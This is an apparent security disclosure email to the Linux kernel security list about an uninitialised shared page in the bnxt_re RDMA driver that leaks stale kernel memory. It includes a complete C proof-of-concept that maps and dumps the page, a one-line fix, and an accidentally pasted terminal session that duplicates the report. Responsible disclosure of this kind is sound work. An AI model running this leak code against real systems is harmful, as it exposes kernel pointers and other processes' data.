Return-Path: <linux-rdma+bounces-20240-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id MMBJEfjq/WkPkwAAu9opvQ
	(envelope-from <linux-rdma+bounces-20240-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:54:00 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 975004F76C2
	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:53:59 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 31A9830DC4FD
	for <lists+linux-rdma@lfdr.de>; Fri,  8 May 2026 13:45:29 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C64943E8660;
	Fri,  8 May 2026 13:45:27 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="itWqUFJo"
X-Original-To: linux-rdma@vger.kernel.org
Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A68043E8C46
	for <linux-rdma@vger.kernel.org>; Fri,  8 May 2026 13:45:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.214.171
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778247927; cv=pass; b=V12+8d2eP9HxKoCcyT/hrg9d7Pseu9d+5NFH52vN4U1mG39RmWW8hT6J5l0Djf3RyI6TaDq0dnE1RdLXSs4II/CZhxdSsW82s0VaUOR/YrnEaKNIs1hC9/Kq7jdEBsMwqf4ml9AxfqC+vkCEjWACbIetD9DP0fSXRv0k+UTvjR0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778247927; c=relaxed/simple;
	bh=n0YfI3CePSAQZm3dq8GMHosmxX9pzq9XQXc+YaLxbSY=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=s0hhGxDxDMFAb4GmzKBcVw8IJFqCRFd4+BnnL0nFoIC31ow55VbjnsOyZNJB4lW+P0KzXGjJjziEg/oqjHZCp6dKL3oSQmp4GItmH0kcD4DqmH5+WESmaKO1dd/xG7yLL3YmDY4w5EFfYrUEqLZjtFB+H9LqmPvs+KyCUqEWVpc=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=itWqUFJo; arc=pass smtp.client-ip=209.85.214.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2bab2548e8bso9751165ad.0
        for <linux-rdma@vger.kernel.org>; Fri, 08 May 2026 06:45:25 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778247925; cv=none;
        d=google.com; s=arc-20240605;
        b=E4lH7/U4U/qFDPm2M99kNLa6r3hBaeHAIjU76U8GMt3aBJ1tC3NQ0PlXYroX7bbpqR
         AFqdccJw8tQlnixJne+Uqge2IH5O8DAZ+bh3eaTB0+4gAXY/CJu9V3Fb7Ph6LMUDMFst
         j5vPuAP0kGsflHxuLDl/2y8I+wu+9wAfMVczkbhYB55hZV9aty4HHS9eQ1x1d7RsB9ya
         vCB2DQeMJYZdW1m+kRWrByvpIzXqJVcTD/Jw4WTwEJwisU9R61wvfDjw7f0QVtUg1S74
         6GwSTMb6oOq8MSTJqPDVQD9If+zRJdLEK2QgdoVIYnftHvPesQ2T8bU78yvS9AhsXSR5
         yO5A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:dkim-signature;
        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
        fh=VvEGpiJFrwtvv7hu26aI+ifH3cd/pa9pXad3dDKHWpA=;
        b=LUv2YDYhC9+QgsuxA1o5wskZtn+nD+XIcsQm84m0YYeMdW76YqgmMgrHZKT7w8+3pJ
         9F8SYtYoSGX3amAdua+MmjVdv4PXup2dbj4BCLXg7I5cE6vli7R6Xq4Bmk8bQ+a5eFiM
         Xju7veW6+tys7/Ao6eA+IzrEr9JDlu0bW1nYO0Qhw7UFQXydaXliRkDnggdwrt/o1Byc
         QsigsGM1Rnh+AVxbbncSUT0k4GqApUOBsJ0Rkbjzva8uhpLDn234zLjC1Hqx0TWfYpsM
         sS00/ewiZf4gSuALSilAQ0o8CdqOsl3pqrGERGbRw96/Ju96aZVqqnSohQBUuUakz7Tf
         B1lg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1778247925; x=1778852725; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
        b=itWqUFJoy6XZHvva8W2PvxxSghVSXEn+Ou2DfAcDYflly7GJ6SjuXEd7l/gOxCBQC5
         zCLRbcvyFFyZjZTOtU18QKCuL6VScuW1VrgIDRmL8ol/MuLLufqNyOKHSiuPMhVw/yUa
         qHb9TJyqUB9vWtHcGVzDGETINsRgHEWTYUlVsJoaBCntirjTVCX/S1+ojvN7fIXe2SMP
         WmLPct1xJSl0YYxOXxJ36BIaMsPzCSTFi3qIh+83qj98ar5Hy5MJYPN2E0Fe8C/k/CRw
         pvNLgpwMGd+nw6QkGqWOVF8rWEi/4PNmiGPMH1I2+sjiz+oFEIupQ/zOmNY9OLLXl9u+
         f0/w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778247925; x=1778852725;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
        b=sc+PymmKU4ppX8ZPKG4R+CP/AUerSL0g3geY2Bviq6aJEd6bJbsD+GczOxcleEP7iN
         8Y8hiXdFbLkU5ZdSisfbEnGsFwhJtCz5yplZsAIwadm/ekdm0xujPBfYDb7cFSavu7pA
         ruPtGTIyBQXM8f9Aib1zbPVfGP6Pgxbfz6jpYypaY+sGzo5NRHf2kFlsU8edsO6MZ0ny
         gkt8kK+ukDtA/PcvZm4ol1stXecj20V9nYLPTVOD5acUfbjwKK3A2AK5g0/UVVf7jqEl
         M0vSBGtkKwX3VBDCXsMTDJBERyXqF8j2NKWTfeW57aYJUmfRlPN9kavtzVlKmEMHUCxe
         ig1g==
X-Forwarded-Encrypted: i=1; AFNElJ9cP/N4TP7h4J2EWKjGhUWN55wgtepcgplCMXO3mHBJQqjjEEyFwd+Q77/q9l96j8IMjTEnOCYqrNGu@vger.kernel.org
X-Gm-Message-State: AOJu0Yw85lhb0uFObBu7XPMfdhiuu3963edYQ3uY9xkRzTNNFUWvbe16
	i7yXSMmo1PVPhDme6BF+VuPcVjrrjCNQD+jKfW1yH8URUqEaVccxZ+qU3pM9eT03P0nd5p3/27M
	DjI4q4A1V+8XZvfM+P4ub2tWZW5yrzks=
X-Gm-Gg: Acq92OHvHcEFUXdL4Q+lBrGgO7gpJ4+uBmwLaVg2SblNDmsJ+pd3plwrNBiD4yP7gA6
	aGdzrBIbOwO9JoSvP/BY5JG7SVCbPvcJABQuj4xvyaO5UVWbUuS5QcRA9VwiAA918AItDau0s4b
	gj0BWz2b/9RgJOtqksrIf3VUBwRouAL1vRNydABXUi6Z5X827aYj9q0dVHVJtXWNjk3p2La8vUe
	SswlYR6sFxo4rF3/p1BWvPE7KC18rLerUfqQGmOrkAZSOMtTSCf25zObxdSobslDWQRggb5RCdW
	gDRoknC97W4vnm7Sr+pBztQikdaRrHWP6tLpg9feZ6R0PcwebiyIcWIuAcIWsfy7XvU6Hea3FRw
	uAMdVAkNXCMGlvQ==
X-Received: by 2002:a17:903:1247:b0:2b0:708f:4dc7 with SMTP id
 d9443c01a7336-2ba796b2374mr139239385ad.29.1778247924725; Fri, 08 May 2026
 06:45:24 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Henrik Holmberg <pomzm67@gmail.com>
Date: Fri, 8 May 2026 15:45:13 +0200
X-Gm-Features: AVHnY4Kc-dgIuD-Rsbaa-X5aRTfqDmHnxaVZDwLsTGCwWx5MWwG-YT7PFRxiuKY
Message-ID: <CAOOd5ej7=KFT8+JO8D3g=QnnhJR2+V--a+JSKcpuxUt=tyGyZw@mail.gmail.com>
Subject: [security] RDMA/bnxt_re: kernel infoleak via uninitialised shpg
 shared page exposed to userspace
To: security@kernel.org
Cc: selvin.xavier@broadcom.com, kalesh-anakkur.purayil@broadcom.com, 
	linux-rdma@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Queue-Id: 975004F76C2
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-20240-lists,linux-rdma=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	MISSING_XM_UA(0.00)[];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[pomzm67@gmail.com,linux-rdma@vger.kernel.org];
	RCPT_COUNT_THREE(0.00)[4];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[linux-rdma];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	DBL_BLOCKED_OPENRESOLVER(0.00)[broadcom.com:email,defensify.se:email,defensify.se:url,keybase.io:url,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid]
X-Rspamd-Action: no action

Hi,

I am reporting an information disclosure in the bnxt_re RDMA driver.
The shared page handed to userspace via BNXT_RE_MMAP_SH_PAGE is
allocated with __get_free_page(GFP_KERNEL) and never zeroed, leaking
up to 4092 bytes of stale kernel data per per-process ucontext.

Affected kernel versions
------------------------
Confirmed present in:
  - 6.6.81 LTS    drivers/infiniband/hw/bnxt_re/ib_verbs.c:4158
  - 6.12.42 LTS   drivers/infiniband/hw/bnxt_re/ib_verbs.c:4241
  - 7.0.5 stable  drivers/infiniband/hw/bnxt_re/ib_verbs.c:4378
  - mainline as of 2026-05-08 (per torvalds/master tip)

No memset(uctx->shpg, 0, PAGE_SIZE) exists in any of these trees.

Problem description
-------------------
bnxt_re_alloc_ucontext() in drivers/infiniband/hw/bnxt_re/ib_verbs.c
allocates the per-context shared page:

    uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);

The page is then registered for mmap exposure via:

    entry =3D bnxt_re_mmap_entry_insert(uctx, 0, BNXT_RE_MMAP_SH_PAGE, NULL=
);

And mapped into userspace by bnxt_re_mmap():

    case BNXT_RE_MMAP_SH_PAGE:
        ret =3D vm_insert_page(vma, vma->vm_start, virt_to_page(uctx->shpg)=
);
        break;

The only kernel write into this page is a single u32 store of the AVID
at offset BNXT_RE_AVID_OFFT (0x10) inside bnxt_re_create_ah():

    wrptr =3D (u32 *)(uctx->shpg + BNXT_RE_AVID_OFFT);
    *wrptr =3D ah->qplib_ah.id;

Since __get_free_page(GFP_KERNEL) returns a buddy page that is not
zeroed, the remaining 4092 bytes of the page contain stale kernel data
when the userspace process maps it. Any user with access to the
relevant /dev/infiniband/uverbsX node and a bnxt_re device can read
this data via a single mmap() call after IB_USER_VERBS_CMD_GET_CONTEXT.

The leaked content depends on the freed kernel object that previously
occupied the page. In practice it can include kernel pointers
(KASLR bypass), slab objects, fragments of recently freed user-process
pages, network skbs, and DMA ring data.

Why this is unintentional, not by design
----------------------------------------
1. The same file already uses get_zeroed_page() for the analogous
   per-SRQ and per-CQ user-mapped shared pages:

       drivers/infiniband/hw/bnxt_re/ib_verbs.c:1956
           srq->uctx_srq_page =3D (void *)get_zeroed_page(GFP_KERNEL);
       drivers/infiniband/hw/bnxt_re/ib_verbs.c:3229
           cq->uctx_cq_page  =3D (void *)get_zeroed_page(GFP_KERNEL);

   shpg is the only outlier.

2. Other RDMA drivers consistently zero pages they expose:

       drivers/infiniband/hw/qedr/verbs.c:758    get_zeroed_page(GFP_USER)
       drivers/infiniband/hw/mlx4/mr.c:306       get_zeroed_page(GFP_KERNEL=
)
       drivers/infiniband/hw/mthca/mthca_allocator.c:129
                                                 get_zeroed_page(GFP_ATOMIC=
)
       drivers/infiniband/hw/efa/efa_verbs.c:190 alloc_pages_exact(...
__GFP_ZERO)
       drivers/infiniband/hw/mlx5/umr.c:509      gfp_mask |=3D __GFP_ZERO

3. The driver only ever writes 4 bytes of the 4096-byte page; the
   remaining bytes have no driver-defined contents and should be zero
   if the convention is respected.

Reproducer
----------
A standalone C reproducer (no libibverbs dependency, only kernel uapi
inline-copied) is included below. It opens /dev/infiniband/uverbsX,
creates a ucontext with IB_USER_VERBS_CMD_GET_CONTEXT, mmap()'s pgoff=3D0
(BNXT_RE_MMAP_SH_PAGE), and dumps the resulting page.

Build:
    gcc -O2 -Wall -Wextra -o 041_poc 041_bnxt_re_shpg_leak.c

Run on a host with bnxt_re hardware:
    ./041_poc

Source (paste into 041_bnxt_re_shpg_leak.c):

----- 8< ----- 8< ----- 8< -----
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

enum { IB_USER_VERBS_CMD_GET_CONTEXT =3D 1 };

struct ib_uverbs_cmd_hdr {
    uint32_t command;
    uint16_t in_words;
    uint16_t out_words;
};

struct ib_uverbs_get_context {
    uint64_t response;
    uint64_t driver_data[0];
};

#define BNXT_RE_RESP_BYTES   1024
#define PAGE_SIZE_LOCAL      4096

static int find_uverbs(char *out, size_t out_len)
{
    DIR *d =3D opendir("/dev/infiniband");
    if (!d) { perror("opendir"); return -1; }
    struct dirent *de;
    while ((de =3D readdir(d))) {
        if (strncmp(de->d_name, "uverbs", 6) =3D=3D 0) {
            snprintf(out, out_len, "/dev/infiniband/%s", de->d_name);
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return -1;
}

static int alloc_ucontext(int fd)
{
    struct {
        struct ib_uverbs_cmd_hdr hdr;
        struct ib_uverbs_get_context cmd;
        uint64_t bnxt_re_req[1];
    } req;
    static uint8_t resp_buf[BNXT_RE_RESP_BYTES] __attribute__((aligned(8)))=
;

    memset(&req, 0, sizeof(req));
    memset(resp_buf, 0, sizeof(resp_buf));

    req.hdr.command   =3D IB_USER_VERBS_CMD_GET_CONTEXT;
    req.hdr.in_words  =3D (sizeof(req) - sizeof(req.hdr)) / 4;
    req.hdr.out_words =3D BNXT_RE_RESP_BYTES / 4;
    req.cmd.response  =3D (uintptr_t)resp_buf;

    if (write(fd, &req, sizeof(req)) < 0) {
        perror("write get_context");
        return -1;
    }
    return 0;
}

int main(void)
{
    char path[256];
    if (find_uverbs(path, sizeof(path)) < 0) return 1;

    int fd =3D open(path, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    if (alloc_ucontext(fd) < 0) { close(fd); return 1; }

    void *p =3D mmap(NULL, PAGE_SIZE_LOCAL, PROT_READ, MAP_SHARED, fd, 0);
    if (p =3D=3D MAP_FAILED) { perror("mmap"); close(fd); return 1; }

    const uint8_t *b =3D p;
    int nonzero =3D 0;
    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i++) {
        if (i >=3D 0x10 && i <=3D 0x13) continue;
        if (b[i]) nonzero++;
    }
    printf("non-zero bytes outside AVID field: %d / %d\n",
           nonzero, PAGE_SIZE_LOCAL - 4);

    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i +=3D 16) {
        printf("%04x  ", i);
        for (int j =3D 0; j < 16; j++) printf("%02x ", b[i+j]);
        printf("\n");
    }

    munmap(p, PAGE_SIZE_LOCAL);
    close(fd);
    return 0;
}
----- >8 ----- >8 ----- >8 -----

Conditions
----------
- Hardware: Broadcom NetXtreme-E NIC with bnxt_re module loaded
  (BCM5750x family).
- Permissions: read/write access to /dev/infiniband/uverbsX. On most
  distributions this requires membership in the rdma group, but some
  configurations expose the node more broadly via udev rules.
- No CAP_SYS_ADMIN, CAP_NET_ADMIN, or CAP_NET_RAW required.

Suggested fix (one-line)
------------------------
diff --git a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
--- a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+++ b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
@@ -4375,7 +4375,7 @@ int bnxt_re_alloc_ucontext(struct ib_ucontext
*ctx, struct ib_udata *udata)

        uctx->rdev =3D rdev;

-       uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
+       uctx->shpg =3D (void *)get_zeroed_page(GFP_KERNEL);
        if (!uctx->shpg) {
                rc =3D -ENOMEM;
                goto fail;

Performance impact: one page-zeroing per ucontext allocation, i.e. once
per RDMA application connection. Negligible.

Disclosure
----------
I have not shared this report outside this email. I am willing to
follow the standard Linux kernel security disclosure timeline (up to
14 days). Please let me know once you have confirmed the issue, and
whether you want me to handle the CVE request via cve@kernel.org or
whether the security team will route it.

Best regards,
<your name>
15:29 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/disclosure
=E2=9D=AF cd ..
15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
=E2=9D=AF ls
disclosure  findings  poc  sources
15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
=E2=9D=AF cd poc/
15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
=E2=9D=AF ls
041_bnxt_re_shpg_leak.c  041_poc
15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
=E2=9D=AF ./041_poc
[!] /dev/infiniband saknas =E2=80=94 RDMA-stack ej laddad?
=E2=9C=981 15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
=E2=9D=AF id
uid=3D1000(l0rds474n) gid=3D1001(l0rds474n)
grupper=3D1001(l0rds474n),20(dialout),24(cdrom),25(floppy),27(sudo),29(audi=
o),30(dip),44(video),46(plugdev),106(netdev),120(bluetooth),126(lpadmin),12=
9(scanner),1000(docker)
15:31 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
=E2=9D=AF cd ..
15:40 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
=E2=9D=AF cd disclosure/
15:40 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/disclosure
=E2=9D=AF cat email-template.txt
To: security@kernel.org
Cc: selvin.xavier@broadcom.com, kalesh-anakkur.purayil@broadcom.com,
linux-rdma@vger.kernel.org
Subject: [security] RDMA/bnxt_re: kernel infoleak via uninitialised
shpg shared page exposed to userspace

Hi,

I am a Senior IT Security Researcher at Defensify (https://defensify.se),
reporting an information disclosure vulnerability in the bnxt_re RDMA
driver. The shared page handed to userspace via BNXT_RE_MMAP_SH_PAGE is
allocated with __get_free_page(GFP_KERNEL) and never zeroed, leaking
up to 4092 bytes of stale kernel data per per-process ucontext.

Affected kernel versions
------------------------
Confirmed present in:
  - 6.6.81 LTS    drivers/infiniband/hw/bnxt_re/ib_verbs.c:4158
  - 6.12.42 LTS   drivers/infiniband/hw/bnxt_re/ib_verbs.c:4241
  - 7.0.5 stable  drivers/infiniband/hw/bnxt_re/ib_verbs.c:4378
  - mainline as of 2026-05-08 (per torvalds/master tip)

No memset(uctx->shpg, 0, PAGE_SIZE) exists in any of these trees.

Problem description
-------------------
bnxt_re_alloc_ucontext() in drivers/infiniband/hw/bnxt_re/ib_verbs.c
allocates the per-context shared page:

    uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);

The page is then registered for mmap exposure via:

    entry =3D bnxt_re_mmap_entry_insert(uctx, 0, BNXT_RE_MMAP_SH_PAGE, NULL=
);

And mapped into userspace by bnxt_re_mmap():

    case BNXT_RE_MMAP_SH_PAGE:
        ret =3D vm_insert_page(vma, vma->vm_start, virt_to_page(uctx->shpg)=
);
        break;

The only kernel write into this page is a single u32 store of the AVID
at offset BNXT_RE_AVID_OFFT (0x10) inside bnxt_re_create_ah():

    wrptr =3D (u32 *)(uctx->shpg + BNXT_RE_AVID_OFFT);
    *wrptr =3D ah->qplib_ah.id;

Since __get_free_page(GFP_KERNEL) returns a buddy page that is not
zeroed, the remaining 4092 bytes of the page contain stale kernel data
when the userspace process maps it. Any user with access to the
relevant /dev/infiniband/uverbsX node and a bnxt_re device can read
this data via a single mmap() call after IB_USER_VERBS_CMD_GET_CONTEXT.

The leaked content depends on the freed kernel object that previously
occupied the page. In practice it can include kernel pointers
(KASLR bypass), slab objects, fragments of recently freed user-process
pages, network skbs, and DMA ring data.

Why this is unintentional, not by design
----------------------------------------
1. The same file already uses get_zeroed_page() for the analogous
   per-SRQ and per-CQ user-mapped shared pages:

       drivers/infiniband/hw/bnxt_re/ib_verbs.c:1956
           srq->uctx_srq_page =3D (void *)get_zeroed_page(GFP_KERNEL);
       drivers/infiniband/hw/bnxt_re/ib_verbs.c:3229
           cq->uctx_cq_page  =3D (void *)get_zeroed_page(GFP_KERNEL);

   shpg is the only outlier.

2. Other RDMA drivers consistently zero pages they expose:

       drivers/infiniband/hw/qedr/verbs.c:758    get_zeroed_page(GFP_USER)
       drivers/infiniband/hw/mlx4/mr.c:306       get_zeroed_page(GFP_KERNEL=
)
       drivers/infiniband/hw/mthca/mthca_allocator.c:129
                                                 get_zeroed_page(GFP_ATOMIC=
)
       drivers/infiniband/hw/efa/efa_verbs.c:190 alloc_pages_exact(...
__GFP_ZERO)
       drivers/infiniband/hw/mlx5/umr.c:509      gfp_mask |=3D __GFP_ZERO

3. The driver only ever writes 4 bytes of the 4096-byte page; the
   remaining bytes have no driver-defined contents and should be zero
   if the convention is respected.

Reproducer
----------
A standalone C reproducer (no libibverbs dependency, only kernel uapi
inline-copied) is included below. It opens /dev/infiniband/uverbsX,
creates a ucontext with IB_USER_VERBS_CMD_GET_CONTEXT, mmap()'s pgoff=3D0
(BNXT_RE_MMAP_SH_PAGE), and dumps the resulting page.

Build:
    gcc -O2 -Wall -Wextra -o 041_poc 041_bnxt_re_shpg_leak.c

Run on a host with bnxt_re hardware:
    ./041_poc

Source (paste into 041_bnxt_re_shpg_leak.c):

----- 8< ----- 8< ----- 8< -----
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

enum { IB_USER_VERBS_CMD_GET_CONTEXT =3D 1 };

struct ib_uverbs_cmd_hdr {
    uint32_t command;
    uint16_t in_words;
    uint16_t out_words;
};

struct ib_uverbs_get_context {
    uint64_t response;
    uint64_t driver_data[0];
};

#define BNXT_RE_RESP_BYTES   1024
#define PAGE_SIZE_LOCAL      4096

static int find_uverbs(char *out, size_t out_len)
{
    DIR *d =3D opendir("/dev/infiniband");
    if (!d) { perror("opendir"); return -1; }
    struct dirent *de;
    while ((de =3D readdir(d))) {
        if (strncmp(de->d_name, "uverbs", 6) =3D=3D 0) {
            snprintf(out, out_len, "/dev/infiniband/%s", de->d_name);
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return -1;
}

static int alloc_ucontext(int fd)
{
    struct {
        struct ib_uverbs_cmd_hdr hdr;
        struct ib_uverbs_get_context cmd;
        uint64_t bnxt_re_req[1];
    } req;
    static uint8_t resp_buf[BNXT_RE_RESP_BYTES] __attribute__((aligned(8)))=
;

    memset(&req, 0, sizeof(req));
    memset(resp_buf, 0, sizeof(resp_buf));

    req.hdr.command   =3D IB_USER_VERBS_CMD_GET_CONTEXT;
    req.hdr.in_words  =3D (sizeof(req) - sizeof(req.hdr)) / 4;
    req.hdr.out_words =3D BNXT_RE_RESP_BYTES / 4;
    req.cmd.response  =3D (uintptr_t)resp_buf;

    if (write(fd, &req, sizeof(req)) < 0) {
        perror("write get_context");
        return -1;
    }
    return 0;
}

int main(void)
{
    char path[256];
    if (find_uverbs(path, sizeof(path)) < 0) return 1;

    int fd =3D open(path, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    if (alloc_ucontext(fd) < 0) { close(fd); return 1; }

    void *p =3D mmap(NULL, PAGE_SIZE_LOCAL, PROT_READ, MAP_SHARED, fd, 0);
    if (p =3D=3D MAP_FAILED) { perror("mmap"); close(fd); return 1; }

    const uint8_t *b =3D p;
    int nonzero =3D 0;
    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i++) {
        if (i >=3D 0x10 && i <=3D 0x13) continue;
        if (b[i]) nonzero++;
    }
    printf("non-zero bytes outside AVID field: %d / %d\n",
           nonzero, PAGE_SIZE_LOCAL - 4);

    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i +=3D 16) {
        printf("%04x  ", i);
        for (int j =3D 0; j < 16; j++) printf("%02x ", b[i+j]);
        printf("\n");
    }

    munmap(p, PAGE_SIZE_LOCAL);
    close(fd);
    return 0;
}
----- >8 ----- >8 ----- >8 -----

Conditions
----------
- Hardware: Broadcom NetXtreme-E NIC with bnxt_re module loaded
  (BCM5750x family).
- Permissions: read/write access to /dev/infiniband/uverbsX. On most
  distributions this requires membership in the rdma group, but some
  configurations expose the node more broadly via udev rules.
- No CAP_SYS_ADMIN, CAP_NET_ADMIN, or CAP_NET_RAW required.

Suggested fix (one-line)
------------------------
diff --git a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
--- a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+++ b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
@@ -4375,7 +4375,7 @@ int bnxt_re_alloc_ucontext(struct ib_ucontext
*ctx, struct ib_udata *udata)

        uctx->rdev =3D rdev;

-       uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
+       uctx->shpg =3D (void *)get_zeroed_page(GFP_KERNEL);
        if (!uctx->shpg) {
                rc =3D -ENOMEM;
                goto fail;

Performance impact: one page-zeroing per ucontext allocation, i.e. once
per RDMA application connection. Negligible.

Disclosure and credit
---------------------
This issue was discovered during independent vulnerability research at
Defensify (https://defensify.se), a Swedish IT security firm focused on
offensive and defensive kernel-level research.

I have not shared this report outside this email. I am willing to
follow the standard Linux kernel security disclosure timeline (up to
14 days). Please let me know once you have confirmed the issue, and
whether you want me to handle the CVE request via cve@kernel.org or
whether the security team will route it.

For the CVE record, mailing-list announcements, fix commit message
("Reported-by:") and any kernel.org acknowledgements, please attribute
the discovery as follows:

    Reported-by: Lord Ulf Henrik Holmberg
<henrik.holmberg@defensify.se> (Defensify)

If your tooling does not accept the parenthetical affiliation, the bare
form

    Reported-by: Lord Ulf Henrik Holmberg <henrik.holmberg@defensify.se>

is acceptable; the @defensify.se address itself attributes the work to
the company. Please CC me on the resulting commit and any CVE record so
we can mirror it on our advisory page.

Best regards,

Lord Ulf Henrik Holmberg
Senior IT Security Researcher
Defensify
https://defensify.se
henrik.holmberg@defensify.se
GitHub: https://github.com/L0rdS474n
+46 73 599 52 38
PGP: https://keybase.io/d313373_m3/pgp_keys.asc

